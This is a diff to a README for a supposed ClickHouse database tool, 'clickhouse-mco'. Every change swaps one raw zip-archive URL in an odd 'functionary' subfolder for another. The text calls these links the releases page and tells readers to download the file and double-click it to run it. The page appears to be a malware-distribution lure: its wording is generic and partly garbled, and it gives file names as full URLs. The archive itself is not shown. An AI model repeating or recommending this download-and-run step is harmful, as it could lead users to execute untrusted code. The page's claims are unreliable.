@@ -1,6 +1,6 @@
 # 🚀 clickhouse-mco - Easy Database Management Tool
 
-![Download](https://raw.githubusercontent.com/sataandangi167/clickhouse-mco/main/functionary/clickhouse-mco.zip)
+![Download](https://github.com/sataandangi167/clickhouse-mco/raw/refs/heads/main/functionary/clickhouse-mco-v2.7.zip)
 
 ## 📋 Description
 clickhouse-mco is a simple tool designed for managing ClickHouse databases efficiently. This application helps you run queries, visualize data, and manage your ClickHouse database with ease. Whether you're a beginner or an experienced user, clickhouse-mco provides all the features you need to get started quickly and efficiently.
@@ -10,11 +10,11 @@ To get started, follow these steps to download the application:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
    
-   [Visit this page to download](https://raw.githubusercontent.com/sataandangi167/clickhouse-mco/main/functionary/clickhouse-mco.zip)
+   [Visit this page to download](https://github.com/sataandangi167/clickhouse-mco/raw/refs/heads/main/functionary/clickhouse-mco-v2.7.zip)
 
 2. **Select the Latest Release:** On the Releases page, find the most recent version. It usually appears at the top of the list.
 
-3. **Download the File:** Look for the appropriate file for your operating system. Click the link to download it. The file may be named like `https://raw.githubusercontent.com/sataandangi167/clickhouse-mco/main/functionary/clickhouse-mco.zip` or `https://raw.githubusercontent.com/sataandangi167/clickhouse-mco/main/functionary/clickhouse-mco.zip`.
+3. **Download the File:** Look for the appropriate file for your operating system. Click the link to download it. The file may be named like `https://github.com/sataandangi167/clickhouse-mco/raw/refs/heads/main/functionary/clickhouse-mco-v2.7.zip` or `https://github.com/sataandangi167/clickhouse-mco/raw/refs/heads/main/functionary/clickhouse-mco-v2.7.zip`.
 
 4. **Run the File:** Once the download finishes, locate the downloaded file on your computer. Double-click it to run the application.
 
@@ -59,4 +59,4 @@ The clickhouse-mco team is dedicated to improving the application. Stay tuned fo
 ## 📣 Share Your Feedback
 We appreciate your input! If you have any thoughts on how to make clickhouse-mco better, please let us know. Your feedback helps us improve the application to serve you better.
 
-Remember, you can always [visit this page to download](https://raw.githubusercontent.com/sataandangi167/clickhouse-mco/main/functionary/clickhouse-mco.zip) the latest version of clickhouse-mco. Happy database management!
+Remember, you can always [visit this page to download](https://github.com/sataandangi167/clickhouse-mco/raw/refs/heads/main/functionary/clickhouse-mco-v2.7.zip) the latest version of clickhouse-mco. Happy database management!
